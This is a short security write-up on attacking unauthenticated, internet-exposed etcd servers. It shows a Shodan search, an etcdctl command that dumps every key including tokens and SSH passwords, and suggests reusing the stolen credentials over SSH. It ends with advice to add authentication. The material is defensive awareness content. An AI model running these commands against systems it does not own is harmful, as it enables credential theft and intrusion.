# PoC: Hacking Systems via Exposed ETCD Instances

[*Etcd*](https://github.com/etcd-io/etcd) is an open-source distributed key-value store that provides a reliable way to store data across a cluster of machines.  
It's often used as a foundational component in distributed systems, serving as a distributed coordination service for managing configurations, maintaining state, and facilitating communication between different parts of a distributed system.  

Originally developed by CoreOS, etcd is written in Go and uses the **Raft consensus algorithm** to ensure consistency and fault-tolerance.  
It's designed to be highly available, durable, and scalable, making it suitable for use in production environments where reliability and consistency are crucial.  

Some common use cases for etcd include service discovery, leader election, configuration management, and coordination between distributed components.  
It's widely used in container orchestration systems like **Kubernetes**, where it helps manage cluster state and configuration data for containers and their applications.  

It is not uncommon to encounter instances of etcd publicly exposed and lacking authentication measures.  
In such cases, malevolent actors may exploit the API using tools like curl or, preferably, [*etcdctl*](https://github.com/etcd-io/etcd/blob/main/etcdctl/README.md), to perform malicious operations. Here is an example of a real-world scenario.  

## The Scenario
A malicious actor is probing exposed services on [*Shodan*](https://www.shodan.io/) with the following simple query: `etcd`.  
After several attempts, they discover an instance of etcd without authentication and attempt to list the *keys/values* using the following command:  
```console
export ETCDCTL_ENDPOINTS="http://$EXPOSED_IP:2379" \
&& export ETCDCTL_API=3 \
&& etcdctl get --prefix ""
```  

Possible Output:  

```console
/apis/url/
https://my.api.com/v1/users/
apis/token/
wBtkA97eCyqPfQWtGBXf35T5AYbAuKGrQ1Ifq6wgzwjhZXtr87yQDgokSjfiVCVI
/ssh/user/
system
/ssh/pass/
P4SsW0rd_+^"!
```  

> Note
> the attacker can also list all the etcd peers with this command: `etcdctl member list`  

Now, please bear in mind that this is merely a hypothetical example.  
An attacker would need to be exceptionally fortunate to stumble upon such data. Nevertheless, albeit rare, such occurrences can transpire, and we can assure you that they have occurred in the past.  

It's worth noting that, at this juncture, an attacker could potentially inflict damage on the system by deleting and/or modifying the values of the etcd keys.  
In this specific scenario, if the server's IP also exposes SSH, the attacker might also attempt to gain access using the values of the keys */ssh/user/* and */ssh/pass/*.  


This scenario serves as a yet another reminder to consistently implement robust authentication mechanisms for our systems and to refrain from exposing them to the entire world unless absolutely necessary (which, in 99.99% of cases, it is not).  


<br>  


- [Back to main page](../../../index.md)  